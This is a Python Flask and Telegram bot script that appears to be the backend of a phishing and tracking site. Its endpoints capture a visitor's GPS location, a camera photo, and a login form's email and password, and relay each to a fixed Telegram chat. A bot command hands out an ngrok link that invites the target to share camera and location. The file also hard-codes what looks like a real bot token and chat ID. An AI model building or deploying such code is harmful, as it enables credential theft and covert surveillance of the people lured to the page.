import os
import telebot
from flask import Flask, render_template, request, jsonify, redirect

app = Flask(__name__)
TOKEN = '7601682636:AAGptIe3KIZ9HMOR8iVM5VyCwluhMH8EJaY'  # Replace with your bot token
CHAT_ID = '571121544'  # Replace with your chat ID
bot = telebot.TeleBot(TOKEN)

# Route to serve the HTML page
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login')
def login():
    return render_template('login.html')

# Endpoint to receive location data
@app.route('/send_location', methods=['POST'])
def send_location():
    data = request.get_json()
    latitude = data['latitude']
    longitude = data['longitude']
    maps_url = f"https://www.google.com/maps?q={latitude},{longitude}"
    # Send location as a message to Telegram
    bot.send_message(CHAT_ID, f"Location received: {maps_url}")
    return jsonify({"status": "success"})

# Endpoint to receive the photo
@app.route('/send_photo', methods=['POST'])
def send_photo():
    file = request.files['photo']
    if file:
        file.save('photo.jpg')
        with open('photo.jpg', 'rb') as photo:
            bot.send_photo(CHAT_ID, photo)
        os.remove('photo.jpg')
    return jsonify({"status": "success"})


# Endpoint untuk mengirim data
@app.route("/send_form", methods=["POST"])
def send_form():
    email = request.form.get("email")
    password = request.form.get("password")

    # Format pesan yang dikirim ke Telegram
    text = f"📩 *Pesan Baru!*\n\n👤 *Email:* {email}\n💬 *Password:* {password}"

    # Kirim pesan ke Telegram
    bot.send_message(CHAT_ID, text, parse_mode="Markdown")
    return redirect('/')

# Telegram bot function to send the link
@bot.message_handler(commands=['start'])
def send_link(message):
    bot.send_message(message.chat.id, "Click the link below to share your camera and location:")
    bot.send_message(message.chat.id, "https://1b82-2001-448a-4041-8876-e450-7477-5fe3-6fe4.ngrok-free.app/")  # Replace with your server's address or ngrok link

# Start both Flask and Telegram bot
if __name__ == '__main__':
    import threading

    # Run the Telegram bot in a separate thread
    def run_bot():
        bot.polling()

    # Start the bot thread
    bot_thread = threading.Thread(target=run_bot)
    bot_thread.start()

    # Start the Flask server
    app.run()
